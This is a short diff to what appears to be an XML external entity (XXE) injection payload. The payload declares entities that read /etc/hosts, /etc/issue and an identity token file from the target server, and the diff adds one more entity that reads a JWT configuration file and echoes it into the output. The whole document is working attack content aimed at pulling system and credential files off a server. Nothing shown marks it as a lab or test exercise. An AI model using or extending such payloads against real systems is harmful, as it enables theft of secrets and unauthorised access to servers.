@@ -4,6 +4,7 @@
 <!ENTITY hosts SYSTEM "file:///etc/hosts">
 <!ENTITY issue SYSTEM "file:///etc/issue">
 <!ENTITY token SYSTEM "file:///etc/tce_dynamic/identity.token">
+<!ENTITY config SYSTEM "file:///etc/tce_dynamic/jwt_config.json">
 ]> 
 <p>
 <p>/etc/passwd: 
@@ -16,4 +17,7 @@
     &issue;
 </p>/indentity:
     &token;
+</p>
+</p>config:
+    &config;
 </p>
